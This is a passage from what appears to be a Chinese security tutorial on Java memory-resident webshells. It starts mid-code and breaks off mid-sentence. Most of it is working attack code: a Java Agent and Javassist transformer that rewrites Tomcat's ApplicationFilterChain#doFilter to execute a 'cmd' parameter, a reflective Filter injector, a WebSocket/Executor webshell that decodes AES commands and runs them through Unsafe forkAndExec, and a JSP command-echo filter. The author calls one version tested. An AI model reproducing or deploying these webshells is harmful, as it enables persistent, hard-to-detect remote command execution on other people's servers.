UnmodifiableClassException &#123;        Class [] classes = inst.getAllLoadedClasses();         //获取目标JVM加载的全部类        for(Class cls : classes)&#123;            if (cls.getName().equals(&quot;com.sleep.hello.Sleep_Hello&quot;))&#123;                 //添加一个transformer到Instrumentation，并重新触发目标类加载                inst.addTransformer(new Hello_Transform(),true);                inst.retransformClasses(cls);            &#125;        &#125;    &#125;&#125;\n\n继承 ClassFileTransformer 类编写一个 transformer ，修改对应类的字节码\njavapackage com.java.agentmain.instrumentation.transformer; import javassist.ClassClassPath;import javassist.ClassPool;import javassist.CtClass;import javassist.CtMethod; import java.lang.instrument.ClassFileTransformer;import java.lang.instrument.IllegalClassFormatException;import java.security.ProtectionDomain; public class Hello_Transform implements ClassFileTransformer &#123;    @Override    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException &#123;        try &#123;             //获取CtClass 对象的容器 ClassPool            ClassPool classPool = ClassPool.getDefault();             //添加额外的类搜索路径            if (classBeingRedefined != null) &#123;                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);                classPool.insertClassPath(ccp);            &#125;             //获取目标类            CtClass ctClass = classPool.get(&quot;com.sleep.hello.Sleep_Hello&quot;);             //获取目标方法            CtMethod ctMethod = ctClass.getDeclaredMethod(&quot;hello&quot;);             //设置方法体            String body = &quot;&#123;System.out.println(\\&quot;Hacker!\\&quot;);&#125;&quot;;            ctMethod.setBody(body);             //返回目标类字节码            byte[] bytes = ctClass.toBytecode();            return bytes;         &#125;catch (Exception e)&#123;            e.printStackTrace();        &#125;        return null;    &#125;&#125;\n\n然后编写Inject_Agent类，将agentmain-Agent注入到目标JVM中\njavapackage com.java.inject; import com.sun.tools.attach.*; import java.io.IOException;import java.util.List; public class Inject_Agent &#123;    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;        //调用VirtualMachine.list()获取正在运行的JVM列表        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();        for(VirtualMachineDescriptor vmd : list)&#123;             //遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent            if(vmd.displayName().equals(&quot;com.sleep.hello.Sleep_Hello&quot;))&#123;                 //连接指定JVM                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());                //加载Agent                virtualMachine.loadAgent(&quot;out/artifacts/Java_Agent_jar/Java_Agent.jar&quot;);                //断开JVM连接                virtualMachine.detach();            &#125;         &#125;    &#125;&#125;\n\n注意这里使用到了 tools.jar 工具包，然后将 agentmain-Agent 打为jar包，注意这里将 tools 和 javassist 依赖一并打包\n然后就可以运行目标类，然后运行Inject_Agent类，注入Agent\nInstrumentation的局限性大多数情况下，我们使用Instrumentation都是使用其字节码插桩的功能，简单来说就是类重定义功能（Class Redefine），但是有以下局限性：\npremain和agentmain两种方式修改字节码的时机都是类文件加载之后，也就是说必须要带有Class类型的参数，不能通过字节码文件和自定义的类名重新定义一个本来不存在的类。\n类的字节码修改称为类转换(Class Transform)，类转换其实最终都回归到类重定义Instrumentation#redefineClasses方法，此方法有以下限制：\n\n新类和老类的父类必须相同\n新类和老类实现的接口数也要相同，并且是相同的接口\n新类和老类访问符必须一致。 新类和老类字段数和字段名要一致\n新类和老类新增或删除的方法必须是private static&#x2F;final修饰的\n只可以修改方法体\n\n实现在代码层现在我们可以通过Java Agent技术来修改正在运行JVM中的方法体，那么我们可以Hook一些JVM一定会调用、并且Hook之后不会影响正常业务逻辑的的方法来实现内存马。\n这里我们以Spring Boot为例，来实现一个Agent内存马。\nSpring Boot中的Tomcat我们知道，Spring Boot中内嵌了一个embed Tomcat作为其启动容器。既然是Tomcat，那肯定有相应的组件容器。我们先来调试一下SpringBoot，部分调用栈如下\nContext:20, Context_Learn (com.example.spring_controller)...(org.springframework.web.servlet.mvc.method.annotation)handleInternal:808, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)handle:87, AbstractHandlerMethodAdapter (org.springframework.web.servlet.mvc.method)doDispatch:1067, DispatcherServlet (org.springframework.web.servlet)doService:963, DispatcherServlet (org.springframework.web.servlet)processRequest:1006, FrameworkServlet (org.springframework.web.servlet)doGet:898, FrameworkServlet (org.springframework.web.servlet)service:655, HttpServlet (javax.servlet.http)service:883, FrameworkServlet (org.springframework.web.servlet)service:764, HttpServlet (javax.servlet.http)internalDoFilter:227, ApplicationFilterChain (org.apache.catalina.core)doFilter:162, ApplicationFilterChain (org.apache.catalina.core)doFilter:53, WsFilter (org.apache.tomcat.websocket.server)internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)doFilter:162, ApplicationFilterChain (org.apache.catalina.core)doFilterInternal:100, RequestContextFilter (org.springframework.web.filter)doFilter:117, OncePerRequestFilter (org.springframework.web.filter)internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)doFilter:162, ApplicationFilterChain (org.apache.catalina.core)doFilterInternal:93, FormContentFilter (org.springframework.web.filter)doFilter:117, OncePerRequestFilter (org.springframework.web.filter)internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)doFilter:162, ApplicationFilterChain (org.apache.catalina.core)doFilterInternal:201, CharacterEncodingFilter (org.springframework.web.filter)doFilter:117, OncePerRequestFilter (org.springframework.web.filter)internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)doFilter:162, ApplicationFilterChain (org.apache.catalina.core)...\n\n可以看到会按照责任链机制反复调用 ApplicationFilterChain#doFilter() 方法\njavapublic void doFilter(ServletRequest request, ServletResponse response)        throws IOException, ServletException &#123;         if( Globals.IS_SECURITY_ENABLED ) &#123;            final ServletRequest req = request;            final ServletResponse res = response;            try &#123;                java.security.AccessController.doPrivileged(                        (java.security.PrivilegedExceptionAction&lt;Void&gt;) () -&gt; &#123;                            internalDoFilter(req,res);                            return null;                        &#125;                );            &#125; ...            &#125;        &#125; else &#123;            internalDoFilter(request,response);        &#125;    &#125;\n\n跟到internalDoFilter()方法中\njavaprivate void internalDoFilter(ServletRequest request,                                  ServletResponse response)        throws IOException, ServletException &#123;         // Call the next filter if there is one        if (pos &lt; n) &#123;            ...        &#125;&#125;\n\n以上两个方法均拥有ServletRequest和ServletResponse，并且hook不会影响正常的业务逻辑，因此很适合作为内存马的回显。下面我们尝试利用\n利用Java Agent实现Spring Filter内存马我们复用上面的agentmain-Agent，修改字节码的关键在于transformer()方法，因此我们重写该方法即可\njavapackage com.java.agentmain.instrumentation.transformer; import javassist.ClassClassPath;import javassist.ClassPool;import javassist.CtClass;import javassist.CtMethod; import java.lang.instrument.ClassFileTransformer;import java.lang.instrument.IllegalClassFormatException;import java.security.ProtectionDomain; public class Filter_Transform implements ClassFileTransformer &#123;    @Override    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException &#123;        try &#123;             //获取CtClass 对象的容器 ClassPool            ClassPool classPool = ClassPool.getDefault();             //添加额外的类搜索路径            if (classBeingRedefined != null) &#123;                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);                classPool.insertClassPath(ccp);            &#125;             //获取目标类            CtClass ctClass = classPool.get(&quot;org.apache.catalina.core.ApplicationFilterChain&quot;);             //获取目标方法            CtMethod ctMethod = ctClass.getDeclaredMethod(&quot;doFilter&quot;);             //设置方法体            String body = &quot;&#123;&quot; +                    &quot;javax.servlet.http.HttpServletRequest request = $1\\n;&quot; +                    &quot;String cmd=request.getParameter(\\&quot;cmd\\&quot;);\\n&quot; +                    &quot;if (cmd !=null)&#123;\\n&quot; +                    &quot;  Runtime.getRuntime().exec(cmd);\\n&quot; +                    &quot;  &#125;&quot;+                    &quot;&#125;&quot;;            ctMethod.setBody(body);             //返回目标类字节码            byte[] bytes = ctClass.toBytecode();            return bytes;         &#125;catch (Exception e)&#123;            e.printStackTrace();        &#125;        return null;    &#125;&#125;\n\nInject_Agent_Spring类如下\njavapackage com.java.inject; import com.sun.tools.attach.*; import java.io.IOException;import java.util.List; public class Inject_Agent_Spring &#123;    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;        //调用VirtualMachine.list()获取正在运行的JVM列表        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();        for(VirtualMachineDescriptor vmd : list)&#123;             //遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent            if(vmd.displayName().equals(&quot;com.example.java_agent_springboot.JavaAgentSpringBootApplication&quot;))&#123;                 //连接指定JVM                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());                //加载Agent                virtualMachine.loadAgent(&quot;out/artifacts/Java_Agent_jar/Java_Agent.jar&quot;);                //断开JVM连接                virtualMachine.detach();            &#125;//            System.out.println(vmd.displayName());         &#125;    &#125;&#125;\n\n启动一个简单的Spring Boot项目\n\n运行 Inject_Agent_Spring 类，在doFilter方法中注入恶意代码，成功执行\n\n这是个基础实现demo，未解决留下Jar包问题与防检测，不建议直接使用。\n实现在Native层看了rebeyond师傅的文章,后\n首先Native层这部分常见一些本地服务和一些链接库等。这一层的一个特点就是通过C和C++语言实现。比如我们现在要执行一个复杂运算，如果通过java代码去实现，那么效率会非常低，此时可以选择通过C或C++代码去实现，然后和上层的Java代码通信(JNI机制)。\nrebeyond师傅的整个分析过程非常的PWN，这里也是不在复述。\n对上述实现的优化原文\n第二篇是对第一篇的优化。\n这里既然师傅打通了JAVA层到Native层，那么内存马实现只是其中一种，甚至可以直接把shellcode放进去，等等。\n已实现在我自己的JYso中。\nSocket 内存马WebSocket是一种全双工通信协议，即客户端可以向服务端发送请求，服务端也可以主动向客户端推送数据。这样的特点，使得它在一些实时性要求比较高的场景效果斐然（比如微信朋友圈实时通知、在线协同编辑等）。主流浏览器以及一些常见服务端通信框架（Tomcat、netty、undertow、webLogic等）都对WebSocket进行了技术支持。\nEndpoint内存马（Tomcat 7.0.47+）看了veo师傅的文章之后写的马，已过测试。\njavapublic class Endpoint implements Filter &#123;    public Session session;    static &#123;        try &#123;            String filterName = &quot;nu1r&quot; + System.nanoTime();            String urlPattern = &quot;/nu1r&quot;;            Class                   clazz = Thread.currentThread().getClass();            java.lang.reflect.Field field = clazz.getDeclaredField(&quot;wsThreadLocals&quot;);            field.setAccessible(true);            Object obj = field.get(Thread.currentThread());            Object[] obj_arr = (Object[]) obj;            for (int j = 0; j &lt; obj_arr.length; j++) &#123;                Object o = obj_arr[j];                if (o == null) continue;                if (o.getClass().getName().endsWith(&quot;WebContainerRequestState&quot;)) &#123;                    Object request        = o.getClass().getMethod(&quot;getCurrentThreadsIExtendedRequest&quot;, new Class[0]).invoke(o, new Object[0]);                    Object servletContext = request.getClass().getMethod(&quot;getServletContext&quot;, new Class[0]).invoke(request, new Object[0]);                    field = servletContext.getClass().getDeclaredField(&quot;context&quot;);                    field.setAccessible(true);                    Object context = field.get(servletContext);                    field = context.getClass().getSuperclass().getDeclaredField(&quot;config&quot;);                    field.setAccessible(true);                    Object webAppConfiguration = field.get(context);                    Method   method  = null;                    Method[] methods = webAppConfiguration.getClass().getMethods();                    for (int i = 0; i &lt; methods.length; i++) &#123;                        if (methods[i].getName().equals(&quot;getFilterMappings&quot;)) &#123;                            method = methods[i];                            break;                        &#125;                    &#125;                    List filerMappings = (List) method.invoke(webAppConfiguration, new Object[0]);                    boolean flag = false;                    for (int i = 0; i &lt; filerMappings.size(); i++) &#123;                        Object filterConfig = filerMappings.get(i).getClass().getMethod(&quot;getFilterConfig&quot;, new Class[0]).invoke(filerMappings.get(i), new Object[0]);                        String name         = (String) filterConfig.getClass().getMethod(&quot;getFilterName&quot;, new Class[0]).invoke(filterConfig, new Object[0]);                        if (name.equals(filterName)) &#123;                            flag = true;                            break;                        &#125;                    &#125;                    //如果已存在同名的 Filter，就不在添加，防止重复添加                    if (!flag) &#123;                        Filter filter = new WSFMSFromThread();                        Object filterConfig = context.getClass().getMethod(&quot;createFilterConfig&quot;, new Class[]&#123;String.class&#125;).invoke(context, new Object[]&#123;filterName&#125;);                        filterConfig.getClass().getMethod(&quot;setFilter&quot;, new Class[]&#123;Filter.class&#125;).invoke(filterConfig, new Object[]&#123;filter&#125;);                        method = null;                        methods = webAppConfiguration.getClass().getMethods();                        for (int i = 0; i &lt; methods.length; i++) &#123;                            if (methods[i].getName().equals(&quot;addFilterInfo&quot;)) &#123;                                method = methods[i];                                break;                            &#125;                        &#125;                        method.invoke(webAppConfiguration, new Object[]&#123;filterConfig&#125;);                        field = filterConfig.getClass().getSuperclass().getDeclaredField(&quot;context&quot;);                        field.setAccessible(true);                        Object original = field.get(filterConfig);                        //设置为null，从而 addMappingForUrlPatterns 流程中不会抛出异常                        field.set(filterConfig, null);                        method = filterConfig.getClass().getDeclaredMethod(&quot;addMappingForUrlPatterns&quot;, new Class[]&#123;EnumSet.class, boolean.class, String[].class&#125;);                        method.invoke(filterConfig, new Object[]&#123;EnumSet.of(DispatcherType.REQUEST), true, new String[]&#123;urlPattern&#125;&#125;);                        //addMappingForUrlPatterns 流程走完，再将其设置为原来的值                        field.set(filterConfig, original);                        method = null;                        methods = webAppConfiguration.getClass().getMethods();                        for (int i = 0; i &lt; methods.length; i++) &#123;                            if (methods[i].getName().equals(&quot;getUriFilterMappings&quot;)) &#123;                                method = methods[i];                                break;                            &#125;                        &#125;                        //这里的目的是为了将我们添加的动态 Filter 放到第一位                        List uriFilterMappingInfos = (List) method.invoke(webAppConfiguration, new Object[0]);                        uriFilterMappingInfos.add(0, filerMappings.get(filerMappings.size() - 1));                    &#125;                    break;                &#125;            &#125;        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;    @Override    public void init(FilterConfig filterConfig) throws ServletException &#123;    &#125;    @Override    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;    &#125;    @Override    public void destroy() &#123;    &#125;&#125;\n\nExecutor内存马（Tomcat 8.5+）实际上这也是WebSocket内存马，只是方法重写的点不一样。\n\n根据深蓝师傅的研究成果\n\n师傅在文中讲解已经很详细了，这里就不在复述，但是这个阶段的Executor内存马存在多次getRequest的问题，细想一下，这很不安全！因为服务器同时接受很多⽤户的请求，突然那天你发个恶意请求，有个普通⽤户莫名其妙收到&#x2F;etc&#x2F;passwd⽂件的内容，这有点尴尬了。\n\n深蓝师傅对此的解决办法是，NioSocketWrapper父类SocketWrapperBase中，有一个方法名为unRead,原文\n\n我根据深蓝师傅的文章，所以有了以下代码\njavapublic class Executor extends Endpoint implements MessageHandler.Whole&lt;String&gt; &#123;    public static final String DEFAULT_SECRET_KEY = &quot;nu1r&quot;;    private static final String AES = &quot;AES&quot;;    private static final byte[] KEY_VI = &quot;nu1r&quot;.getBytes();    private static final String CIPHER_ALGORITHM = &quot;AES/CBC/PKCS5Padding&quot;;    private static java.util.Base64.Decoder base64Decoder = java.util.Base64.getDecoder();    static &#123;        String                wsName                = &quot;/nu1r&quot;;        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();        StandardContext       standardContext       = (StandardContext) webappClassLoaderBase.getResources().getContext();        ServerEndpointConfig  build                 = ServerEndpointConfig.Builder.create(TWSMSFromThread.class, wsName).build();        WsServerContainer     attribute             = (WsServerContainer) standardContext.getServletContext().getAttribute(ServerContainer.class.getName());        try &#123;            attribute.addEndpoint(build);            standardContext.getServletContext().setAttribute(wsName, wsName);        &#125; catch (DeploymentException e) &#123;            throw new RuntimeException(e);        &#125;    &#125;    public Session session;    public void onMessage(String message) &#123;        String cmd = getRequest();        if (cmd.length() &gt; 1) &#123;            getResponse(execCmd(cmd).toByteArray());        &#125;        this.execute($1, Long.parseLong(&quot;0&quot;), java.util.concurrent.TimeUnit.MILLISECONDS);    &#125;    @Override    public void onOpen(Session session, EndpointConfig config) &#123;        this.session = session;        session.addMessageHandler(this);    &#125;    public static String decode(String key, String content) &#123;        try &#123;            javax.crypto.SecretKey secretKey = new javax.crypto.spec.SecretKeySpec(key.getBytes(), AES);            javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance(CIPHER_ALGORITHM);            cipher.init(javax.crypto.Cipher.DECRYPT_MODE, secretKey, new javax.crypto.spec.IvParameterSpec(KEY_VI));            byte[] byteContent = base64Decoder.decode(content);            byte[] byteDecode = cipher.doFinal(byteContent);            return new String(byteDecode, java.nio.charset.StandardCharsets.UTF_8);        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;        return null;    &#125;    public static byte[] toCString(String s) &#123;\t\tif (s == null)\t\t\treturn null;\t\tbyte[] bytes  = s.getBytes();\t\tbyte[] result = new byte[bytes.length + 1];\t\tSystem.arraycopy(bytes, 0,\t\t\t\tresult, 0,\t\t\t\tbytes.length);\t\tresult[result.length - 1] = (byte) 0;\t\treturn result;\t&#125;    public static java.lang.reflect.Method getMethodByClass(Class cs, String methodName, Class[] parameters) &#123;\t\tjava.lang.reflect.Method method = null;\t\twhile (cs != null) &#123;\t\t\ttry &#123;\t\t\t\tmethod = cs.getDeclaredMethod(methodName, parameters);\t\t\t\tmethod.setAccessible(true);\t\t\t\tcs = null;\t\t\t&#125; catch (Exception e) &#123;\t\t\t\tcs = cs.getSuperclass();\t\t\t&#125;\t\t&#125;\t\treturn method;\t&#125;    public static Object getMethodAndInvoke(Object obj, String methodName, Class[] parameterClass, Object[] parameters) &#123;\t\ttry &#123;\t\t\tjava.lang.reflect.Method method = getMethodByClass(obj.getClass(), methodName, parameterClass);\t\t\tif (method != null)\t\t\t\treturn method.invoke(obj, parameters);\t\t&#125; catch (Exception ignored) &#123;\t\t&#125;\t\treturn null;\t&#125;    public static Object getFieldValue(Object obj, String fieldName) throws Exception &#123;\t\tjava.lang.reflect.Field f = null;\t\tif (obj instanceof java.lang.reflect.Field) &#123;\t\t\tf = (java.lang.reflect.Field) obj;\t\t&#125; else &#123;\t\t\tClass cs = obj.getClass();\t\t\twhile (cs != null) &#123;\t\t\t\ttry &#123;\t\t\t\t\tf = cs.getDeclaredField(fieldName);\t\t\t\t\tcs = null;\t\t\t\t&#125; catch (Exception e) &#123;\t\t\t\t\tcs = cs.getSuperclass();\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;\t\tf.setAccessible(true);\t\treturn f.get(obj);\t&#125;    public static java.io.ByteArrayOutputStream execCmd(String cmd) &#123;\t\ttry &#123;\t\t\tif (cmd != null &amp;&amp; !cmd.isEmpty()) &#123;\t\t\t\tString[] cmds = null;\t\t\t\tif (System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;)) &#123;\t\t\t\t\tcmds = new String[]&#123;&quot;cmd&quot;, &quot;/c&quot;, cmd&#125;;\t\t\t\t&#125; else &#123;\t\t\t\t\tcmds = new String[]&#123;&quot;/bin/bash&quot;, &quot;-c&quot;, cmd&#125;;\t\t\t\t&#125;\t\t\t\tjava.lang.reflect.Field theUnsafeField = sun.misc.Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);\t\t\t\ttheUnsafeField.setAccessible(true);\t\t\t\tsun.misc.Unsafe unsafe = (sun.misc.Unsafe) theUnsafeField.get(null);\t\t\t\tClass processClass = null;\t\t\t\ttry &#123;\t\t\t\t\tprocessClass = Class.forName(&quot;java.lang.UNIXProcess&quot;);\t\t\t\t&#125; catch (ClassNotFoundException e) &#123;\t\t\t\t\tprocessClass = Class.forName(&quot;java.lang.ProcessImpl&quot;);\t\t\t\t&#125;\t\t\t\tObject processObject = unsafe.allocateInstance(processClass);\t\t\t\tbyte[][] args = new byte[cmds.length - 1][];\t\t\t\tint      size = args.length;\t\t\t\tfor (int i = 0; i &lt; args.length; i++) &#123;\t\t\t\t\targs[i] = cmds[i + 1].getBytes();\t\t\t\t\tsize += args[i].length;\t\t\t\t&#125;\t\t\t\tbyte[] argBlock = new byte[size];\t\t\t\tint    i        = 0;\t\t\t\tfor (int i1 = 0; i1 &lt; args.length; i1++) &#123;\t\t\t\t\tSystem.arraycopy(args[i1], 0, argBlock, i, args[i1].length);\t\t\t\t\ti += args[i1].length + 1;\t\t\t\t&#125;\t\t\t\tint[]  std_fds               = new int[]&#123;-1, -1, -1&#125;;\t\t\t\tObject launchMechanismObject = getFieldValue(processObject, &quot;launchMechanism&quot;);\t\t\t\tbyte[] helperpathObject      = (byte[]) getFieldValue(processObject, &quot;helperpath&quot;);\t\t\t\tint    ordinal               = java.lang.Integer.parseInt(getMethodAndInvoke(launchMechanismObject, &quot;ordinal&quot;, null, null).toString());\t\t\t\tgetMethodAndInvoke(processObject, &quot;forkAndExec&quot;,\t\t\t\t\t\tnew Class[]&#123;int.class, byte[].class, byte[].class, byte[].class, int.class, byte[].class, int.class, byte[].class, int[].class, boolean.class&#125;,\t\t\t\t\t\tnew Object[]&#123;Integer.valueOf(ordinal + 1), helperpathObject, toCString(cmds[0]), argBlock, Integer.valueOf(args.length), null, Integer.valueOf(1), null, std_fds, java.lang.Boolean.FALSE&#125;);\t\t\t\tgetMethodAndInvoke(processObject, &quot;initStreams&quot;, new Class[]&#123;int[].class&#125;, new Object[]&#123;std_fds&#125;);\t\t\t\tjava.io.InputStream           in   = (java.io.InputStream) getMethodAndInvoke(processObject, &quot;getInputStream&quot;, null, null);\t\t\t\tjava.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();\t\t\t\tint                           a    = 0;\t\t\t\tbyte[]                        b    = new byte[1024];\t\t\t\twhile ((a = in.read(b)) != -1) &#123;\t\t\t\t\tbaos.write(b, 0, a);\t\t\t\t&#125;\t\t\t\treturn baos;\t\t\t&#125;\t\t&#125; catch (Exception ignored) &#123;\t\t&#125;\t\treturn null;\t&#125;    public String getRequest() &#123;        try &#123;            Thread[] threads = (Thread[]) ((Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), &quot;threads&quot;));            for (Thread thread : threads) &#123;                if (thread != null) &#123;                    String threadName = thread.getName();                    if (threadName.contains(&quot;Poller&quot;)) &#123;                        Object target = getFieldValue(thread, &quot;target&quot;);                        if (target instanceof Runnable) &#123;                            try &#123;                                byte[] bytes = new byte[8192];                                ByteBuffer buf = ByteBuffer.wrap(bytes);                                try &#123;                                    LinkedList linkedList = (LinkedList) getFieldValue(getFieldValue(getFieldValue(target, &quot;selector&quot;), &quot;kqueueWrapper&quot;), &quot;updateList&quot;);                                    for (Object obj : linkedList) &#123;                                        try &#123;                                            SelectionKey[] selectionKeys = (SelectionKey[]) getFieldValue(getFieldValue(obj, &quot;channel&quot;), &quot;keys&quot;);                                            for (Object tmp : selectionKeys) &#123;                                                try &#123;                                                    NioEndpoint.NioSocketWrapper nioSocketWrapper = (NioEndpoint.NioSocketWrapper) getFieldValue(tmp, &quot;attachment&quot;);                                                    try &#123;                                                        nioSocketWrapper.read(false, buf);                                                        String a = new String(buf.array(), &quot;UTF-8&quot;);                                                        if (a.indexOf(&quot;nu1r&quot;) &gt; -1) &#123;                                                            System.out.println(a.indexOf(&quot;nu1r&quot;));                                                            System.out.println(a.indexOf(&quot;\\r&quot;, a.indexOf(&quot;nu1r&quot;)));                                                            String b = a.substring(a.indexOf(&quot;nu1r&quot;) + &quot;nu1r&quot;.length() + 2, a.indexOf(&quot;\\r&quot;, a.indexOf(&quot;nu1r&quot;)));                                                            b = decode(DEFAULT_SECRET_KEY, b);                                                            buf.position(0);                                                            nioSocketWrapper.unRead(buf);                                                            System.out.println(b);                                                            System.out.println(new String(buf.array(), &quot;UTF-8&quot;));                                                            return b;                                                        &#125;                                                        else&#123;                                                            buf.position(0);                                                            nioSocketWrapper.unRead(buf);                                                            continue;                                                        &#125;                                                    &#125; catch (Exception e) &#123;                                                        nioSocketWrapper.unRead(buf);                                                    &#125;                                                &#125; catch (Exception e) &#123;                                                    continue;                                                &#125;                                            &#125;                                        &#125; catch (Exception e) &#123;                                            continue;                                        &#125;                                    &#125;                                &#125; catch (Exception var11) &#123;                                    System.out.println(var11);                                    continue;                                &#125;                            &#125; catch (Exception ignored) &#123;                            &#125;                        &#125;                    &#125;                    if (threadName.contains(&quot;exec&quot;)) &#123;                        return new String();                    &#125; else &#123;                        continue;                    &#125;                &#125;            &#125;            return new String();    &#125;    public void getResponse(byte[] res) &#123;\t\ttry &#123;\t\t\tThread[] threads = (Thread[]) ((Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), &quot;threads&quot;));\t\t\tfor (int i = 0; i &lt; threads.length; i++) &#123;\t\t\t\tThread thread = threads[i];\t\t\t\tif (thread != null) &#123;\t\t\t\t\tString threadName = thread.getName();\t\t\t\t\tif (!threadName.contains(&quot;exec&quot;) &amp;&amp; threadName.contains(&quot;Acceptor&quot;)) &#123;\t\t\t\t\t\tObject target = getFieldValue(thread, &quot;target&quot;);\t\t\t\t\t\tif (target instanceof Runnable) &#123;\t\t\t\t\t\t\ttry &#123;\t\t\t\t\t\t\t\tjava.util.ArrayList objects = (java.util.ArrayList) getFieldValue(getFieldValue(getFieldValue(getFieldValue(target, &quot;this$0&quot;), &quot;handler&quot;), &quot;global&quot;), &quot;processors&quot;);\t\t\t\t\t\t\t\tfor (int j = 0; j &lt; objects.size(); j++) &#123;\t\t\t\t\t\t\t\t\torg.apache.coyote.RequestInfo request  = (org.apache.coyote.RequestInfo) objects.get(j);\t\t\t\t\t\t\t\t\torg.apache.coyote.Response    response = (org.apache.coyote.Response) getFieldValue(getFieldValue(request, &quot;req&quot;), &quot;response&quot;);\t\t\t\t\t\t\t\t\tresponse.addHeader(&quot;Server-token&quot;, base64Encode(res));\t\t\t\t\t\t\t\t&#125;\t\t\t\t\t\t\t&#125; catch (Exception ignored) &#123;\t\t\t\t\t\t\t&#125;\t\t\t\t\t\t&#125;\t\t\t\t\t&#125;\t\t\t\t&#125;\t\t\t&#125;\t\t&#125; catch (Exception ignored) &#123;\t\t&#125;\t&#125;&#125;\n\npoller内存马（Tomcat 8.5-）\n深蓝师傅研究成果的延伸，由kd师傅提出，解决了Tomcat8.5之前版本的socket内存马问题。\n\n两者都存在一个问题：socket上的读缓存区需要回写,原因很简单，你需要读取请求并且分析请求中是否有Key来执行，即需要一个标识区别攻击者和正常用户。问题来了，读缓存区一旦读取，那么正常情况下是无法将数据放回去的，这就导致读缓冲区一旦read之后，如果是正常用户的请求，你此刻已经无法回写数据了，那么当HttpRequest做封装时，已经没有数据了，导致业务受到严重的影响。\n幸好，tomcat8.5.0以后，在tomcat封装的socket支持unread的数据回写，\n但是tomcat8.5.0之前版本就需要新的解决办法，Socket毒化（稳定）\n\n每次请求都在缓存加上本次通信的socket(IP+端口)，表明缓存的数据是由那个socket发起的，接着每当我们读readbuf的数据时，我们可以得到两个信息：第一，这个包存不存命令执行的口令，第二，这个包是哪个socket发出的。这样哪怕缓存的请求被用户发出，但是socket记录已经表明了谁发起的，此时自然匹配不到用户的socket。需要注意的是，毒化对象不可以是IP，因为如果遇到反向代理的情况，你毒化的可是整个nginx服务。至于什么时候需要删除毒化表中的数据，其实很简单，tomcat的监听是使用Selector做事件监听的，当有事件来时，Selector负责收集事件的类型，然后提交给业务处理，当业务处理时，程序会注销本次的事件，避免Selector反复提交相同事件。这里我们就不注销事件，让socket反复读数据，这样一旦客户端关闭，服务端sokcet在读的时候一定会报错抛出，在处理异常时，我们直接删除对应毒化表中的数据即可。\nNginx反向代理问题通过图片可以看到，所有的事情都是建立在socket连接不中断的基础之上进行。但是在nginx反向代理中默认是采用端口轮询的形式进行通信，即第一次代理端口用22222，第二次就是22223…这样显然无法让socket毒化成功。所以，致命性很大。但是大部分nginx配置也都会加上keep-alive的支持。只能说有点看命的节奏。\n实现逻辑Poller内存马的逻辑还是比较简单，你只要继承tomcat本身的NioEndpoint.Poller，然后重写processKey方法即可，如果需要处理业务，就自己操作socket，如果放行业务，就直接把socket交给父类processKey实现即可。\n内存马回显技术所谓回显，其实就是获取命令执行的结果，这种技术常用于目标机器不出网，无法反弹shell的情况。对于Java的中间件来讲，其关键就是获取request和response对象。\n回显示例这里我们以上文提到的Tomcat Filter内存马为例，获取对应的回显，关键代码如下\njava&lt;%! public class Shell_Filter implements Filter &#123;    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException &#123;        String cmd = request.getParameter(&quot;cmd&quot;);        response.setContentType(&quot;text/html; charset=UTF-8&quot;);        PrintWriter writer = response.getWriter();        if (cmd != null) &#123;            try &#123;                InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();                 //将命令执行结果写入扫描器并读取所有输入                Scanner scanner = new Scanner(in).useDelimiter(&quot;\\\\A&quot;);                String result = scanner.hasNext()?scanner.next():&quot;&quot;;                scanner.close();                writer.write(result);                writer.flush();                writer.close();            &#125; catch (IOException e) &#123;                e.printStackTrace();            &#125; catch (NullPointerException n) &#123;                n.printStackTrace();            &#125;        &#125;        chain.doFilter(request, response);    &#125;&#125;%&gt;\n\n\n上述方式我们是通过JSP文件来注入内存马的。由于JSP中内置了一些关键对象，所以我们能够很容易地获得Request和Response对象，并能通过他们来获取目标JVM的上下文Context。那如果我们要通过反序列化漏洞来注入内存马，又如何获取到目标JVM的request和response对象呢？\nThreadLocal Response回显思路来自于 kingkk师傅\n首先要注意的是，我们寻找的request对象应该是一个和当前线程ThreadLocal有关的对象，而不是一个全局变量。这样才能获取到当前线程的相关信息。最终我们能够在 org.apache.catalina.core.ApplicationFilterChain 类中找到这样两个变量 lastServicedRequest 和 lastServicedResponse 。并且这两个属性还是静态的，我们获取时无需实例化对象。\n\n在我们熟悉的 ApplicationFilterChain#internalDoFilter 中，Tomcat会将request对象和response对象存储到这两个变量中\n\n虽然此时的 ApplicationDispatcher.WRAP_SAME_OBJECT 为 false 